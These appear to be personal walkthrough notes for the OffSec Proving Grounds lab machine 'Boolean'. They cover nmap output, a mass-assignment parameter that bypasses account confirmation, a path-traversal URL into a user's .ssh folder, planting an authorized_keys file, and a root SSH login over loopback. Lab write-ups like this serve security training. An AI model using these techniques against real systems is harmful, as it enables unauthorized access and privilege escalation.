```
┌──(kali㉿kali)-[~/PG/boolean]
└─$ nmap -p- --min-rate 10000 192.168.174.231                                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 02:06 EST
Nmap scan report for 192.168.174.231
Host is up (0.047s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
3000/tcp closed ppp

Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds
                                                                                                                                                            
┌──(kali㉿kali)-[~/PG/boolean]
└─$ nmap -p 22,80,3000 -sCV 192.168.174.231                                                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 02:07 EST
Nmap scan report for 192.168.174.231
Host is up (0.049s latency).

PORT     STATE  SERVICE VERSION
22/tcp   open   ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp   open   http
| http-title: Boolean
|_Requested resource was http://192.168.174.231/login
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|_    Content-Length: 0
3000/tcp closed ppp
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.95%I=7%D=2/16%Time=67B18ECA%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,55,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;
SF:\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,55,"H
SF:TTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x20charset=
SF:UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,1C,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\n\r\n")%r(FourOhFourRequest,55,"HTTP/1\.0\x20403\x20Forbid
SF:den\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\
SF:x200\r\n\r\n")%r(GenericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(RPCCheck,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(D
SF:NSVersionBindReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(
SF:DNSStatusRequestTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(
SF:Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLSessionReq,1
SF:C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalServerCookie,
SF:1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSSessionReq,1C,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\n\r\n")%r(LPDString,1C,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\n\r\n")%r(LDAPSearchReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:\r\n")%r(LDAPBindReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r
SF:(SIPOptions,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(LANDesk-
SF:RC,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalServer,1C
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(NCP,1C,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\n\r\n")%r(NotesRPC,1C,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\n\r\n")%r(JavaRMI,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:n\r\n")%r(WMSRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r
SF:(oracle-tns,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(ms-sql-s
SF:,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(afp,1C,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\n\r\n")%r(giop,1C,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.39 seconds
```

```

```

![Pasted image 20250216151143](<0. Attachments/Pasted image 20250216151143.png>)

register a new user then
![Pasted image 20250216160041](<0. Attachments/Pasted image 20250216160041.png>)

![Pasted image 20250216160100](<0. Attachments/Pasted image 20250216160100.png>)

add line
```
&user%5Bconfirmed%5D=True
```

![Pasted image 20250216160240](<0. Attachments/Pasted image 20250216160240.png>)

![Pasted image 20250216160546](<0. Attachments/Pasted image 20250216160546.png>)
upload a webshell but it just downloads the file

![Pasted image 20250216160701](<0. Attachments/Pasted image 20250216160701.png>)

![Pasted image 20250216160719](<0. Attachments/Pasted image 20250216160719.png>)

![Pasted image 20250216161051](<0. Attachments/Pasted image 20250216161051.png>)
```
http://192.168.174.231/?cwd=../../../../../../../../../home/remi&file=.ssh&download=true
```

[SSH Keys | oscp-notes](https://mqt.gitbook.io/oscp-notes/ssh-keys?source=post_page-----9c7f5b963559---------------------------------------)

To create a ssh for ourselves
![Pasted image 20250216161609](<0. Attachments/Pasted image 20250216161609.png>)
![Pasted image 20250216161628](<0. Attachments/Pasted image 20250216161628.png>)

upload authorized_keys in the .ssh folder
![Pasted image 20250216162644](<0. Attachments/Pasted image 20250216162644.png>)

![Pasted image 20250216162705](<0. Attachments/Pasted image 20250216162705.png>)

![Pasted image 20250216162746](<0. Attachments/Pasted image 20250216162746.png>)

![Pasted image 20250216163533](<0. Attachments/Pasted image 20250216163533.png>)

![Pasted image 20250216163444](<0. Attachments/Pasted image 20250216163444.png>)

![Pasted image 20250216163644](<0. Attachments/Pasted image 20250216163644.png>)

but we need to ssh on loopback
```
ssh -o IdentitiesOnly=yes -i /home/remi/.ssh/keys/root root@127.0.0.1
```

![Pasted image 20250216164232](<0. Attachments/Pasted image 20250216164232.png>)

[Boolean — Offsec Proving Grounds Walkthrough | by Rutik Gajera | Medium](https://medium.com/@raj.patel33605/boolean-offsec-proving-groundswriteup-8f626bbb1b3f#:~:text=In%20this%20article%2C%20we%20navigate%20through%20the%20different,exploitation%2C%20and%20ultimately%20aim%20to%20gain%20system-level%20privileges.)

